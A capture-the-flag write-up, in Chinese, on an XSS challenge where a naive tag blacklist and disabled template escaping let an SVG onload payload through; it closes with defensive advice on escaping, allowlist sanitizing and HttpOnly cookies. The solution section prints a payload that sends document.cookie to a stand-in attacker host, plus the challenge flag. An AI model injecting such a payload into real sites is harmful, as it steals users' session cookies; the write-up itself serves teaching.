# getting the admin

## 题目简述

本题沿用管理员访问报告并携带 Flag Cookie 的场景，但增加了标签黑名单。清洗函数只删除 `script`、`style`、`body`、`div`、`span`、`img` 的精确开始和结束标签，报告模板仍关闭自动转义，因此可以换用未列入黑名单且支持事件处理器的 SVG 元素。

## 解题过程

过滤器只执行：

```python
for tag in BANNED:
    report = report.replace(f"<{tag}>", "").replace(f"</{tag}>", "")
```

它既不解析 HTML，也不删除属性。提交如下单标签载荷：

```html
<svg onload="location='https://attacker.example/collect?c='+encodeURIComponent(document.cookie)"></svg>
```

`svg` 不在 `BANNED` 中，内容会原样进入 `{% autoescape false %}` 的报告页。管理员机器人写入 `flag` Cookie 后再次访问该页，`onload` 自动触发，并把 `document.cookie` 放入接收端请求参数。日志中可恢复：

```text
greyhats{br0k3n_d3f3nces_411_ar0und}
```

这里不需要诱导管理员点击；事件在元素加载时自动执行。若使用其他标签，也必须确认事件能在无交互情况下触发且没有被精确替换规则破坏。

## 方法总结

HTML 是带命名空间、属性、大小写和错误恢复规则的语言，字符串黑名单无法覆盖所有可执行上下文。正确修复应保留模板转义；若业务必须接受 HTML，再用成熟解析器按允许标签和允许属性做白名单清洗。敏感 Cookie 设置 HttpOnly 还能降低 XSS 直接窃取凭据的影响。
